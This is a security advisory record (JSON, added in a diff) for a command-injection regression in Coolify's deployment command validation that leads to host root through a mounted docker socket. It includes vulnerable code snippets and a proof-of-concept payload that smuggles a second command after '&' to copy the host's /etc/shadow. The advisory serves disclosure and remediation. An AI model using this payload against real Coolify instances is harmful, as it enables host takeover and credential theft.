@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-chg4-63hm-xv9x",
+  "repo": {
+    "cve_id": "CVE-2026-42204",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nThe fix for the private advisory **GHSA-qqrq-r9h4-x6wp** (commit `23f9156c7`) introduced a strict `SHELL_SAFE_COMMAND_PATTERN`. Two later commits relaxed it to allow `&`, `\"`, `'`. Allowing `&` reopens command injection: in bash, `cmd1 & cmd2` runs both. Any team Member can put a payload in `docker_compose_custom_build_command` / `docker_compose_custom_start_command`, deploy, and execute code in the `coolify-helper` container - which has `/var/run/docker.sock` mounted, giving root on the host.\r\n\r\n## Root cause\r\n\r\n`app/Support/ValidationPatterns.php:47`\r\n\r\n```php\r\n// current (vulnerable)\r\npublic const SHELL_SAFE_COMMAND_PATTERN = '/^[a-zA-Z0-9 \\t._\\-\\/=:@,+\\[\\]{}#%^~&\"\\']+$/';\r\n\r\n// commit 23f9156c7 (GHSA-qqrq-r9h4-x6wp fix - safe)\r\npublic const SHELL_SAFE_COMMAND_PATTERN = '/^[a-zA-Z0-9 \\t._\\-\\/=:@,+\\[\\]{}#%^~]+$/';\r\n```\r\n\r\nRegressed by:\r\n- `e2ba44d0c` (2026-03-25) - added `&`, `\"` (\"to support `&&` chaining\")\r\n- `e36ae82d9` (2026-04-08) - added `'`\r\n\r\nA character-class regex cannot tell `&` (background separator) from `&&` (logical AND).\r\n\r\n## Sink\r\n\r\n`app/Jobs/ApplicationDeploymentJob.php:730`\r\n```php\r\nexecuteInDocker($this->deployment_uuid, \"cd {$this->basedir} && {$build_command}\")\r\n```\r\n\r\n`bootstrap/helpers/docker.php:145` (only escapes `'`, lets `&` through):\r\n```php\r\n$escapedCommand = str_replace(\"'\", \"'\\\\''\", $command);\r\nreturn \"docker exec {$containerId} bash -c '{$escapedCommand}'\";\r\n```\r\n\r\n`coolify-helper` container is launched at `ApplicationDeploymentJob.php:2038` with `-v /var/run/docker.sock:/var/run/docker.sock` → code execution inside it = host root via `docker run -v /:/host`.\r\n\r\n## PoC\r\n\r\nSet `docker_compose_custom_start_command` (or build) to:\r\n\r\n```\r\ntrue & docker run --rm -v /:/h alpine sh -c \"cp /h/etc/shadow /h/tmp/leak\"\r\n```\r\n\r\nClick Deploy. Final command on host:\r\n```\r\ndocker exec <UUID> bash -c 'cd /workdir && true & docker run --rm -v /:/h alpine sh -c \"cp /h/etc/shadow /h/tmp/leak\"'\r\n```\r\nBash splits on `&` → second command runs → host `/etc/shadow` copied out.\r\n\r\n## Fix\r\n\r\nRevert the pattern to commit `23f9156c7`'s form (drop `&`, `\"`, `'`). For the `&&` use-case, parse with a real shell tokenizer or split the field into structured args - character-class allow-listing cannot safely permit any of `;`, `&`, `|`.\r\n\r\nDefense in depth: do not bind-mount `/var/run/docker.sock` into the build helper.",
+    "ghsa_id": "GHSA-chg4-63hm-xv9x",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-chg4-63hm-xv9x",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-chg4-63hm-xv9x"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42204"
+      }
+    ],
+    "published_at": "2026-07-02T16:35:28Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated RCE via SHELL_SAFE_COMMAND_PATTERN regression → host root",
+    "updated_at": "2026-07-02T16:35:28Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": ">= 4.0.0-beta.471, <= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
